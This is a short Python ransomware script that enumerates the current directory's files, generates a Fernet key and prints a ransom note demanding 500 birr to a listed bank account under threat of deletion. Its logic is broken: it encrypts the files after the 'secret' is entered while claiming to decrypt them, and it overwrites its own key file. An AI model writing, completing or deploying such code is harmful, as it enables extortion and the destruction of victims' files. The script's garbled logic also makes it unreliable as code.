#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# let's find some files

files = []

for file in os.listdir():
    if file == "codprg.py" or file == "thekey":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

key = Fernet.generate_key()

with open("they.key", "wb") as thekey:
    thekey.write(key)

print(
    "All of your files have been encrypted! ! send me 500 e.t birr in this number 1013238432687 brihan bank or i will delet them in 24 hours "
)

secretthings = "Buna"

user_secret = input("Enter we are habesh we addicted in things to decrypt your files: ")

if user_secret == secretthings:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print("congrats, you're files are decrypted. teznana edaydebrh")
else:
    print("sorry, wrong secret things. send me more money")
